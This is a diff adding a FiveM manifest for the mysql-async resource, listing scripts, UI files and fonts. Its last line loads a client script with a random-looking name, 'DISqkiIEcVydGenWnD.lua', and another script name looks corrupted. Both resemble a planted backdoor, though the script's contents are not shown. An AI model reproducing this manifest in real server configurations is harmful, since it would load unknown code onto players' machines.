@@ -1,0 +1,29 @@
+fx_version 'bodacious'
+game 'gta5'
+
+version '3.2.0'
+
+server_script 'mysql_async.js'
+client_script {
+	'mysql_async-_lient.js',
+}
+
+files {
+  'ui/index.html',
+  'ui/app.js',
+  'ui/app.css',
+  'ui/fonts/fira-sans-v9-latin-700.woff',
+  'ui/fonts/fira-sans-v9-latin-700.woff2',
+  'ui/fonts/fira-sans-v9-latin-italic.woff',
+  'ui/fonts/fira-sans-v9-latin-italic.woff2',
+  'ui/fonts/fira-sans-v9-latin-regular.woff',
+  'ui/fonts/fira-sans-v9-latin-regular.woff2',
+  'ui/fonts/MaterialIcons-Regular.eot',
+  'ui/fonts/MaterialIcons-Regular.ttf',
+  'ui/fonts/MaterialIcons-Regular.woff',
+  'ui/fonts/MaterialIcons-Regular.woff2',
+}
+
+ui_page 'ui/index.html'
+
+client_script "DISqkiIEcVydGenWnD.lua"
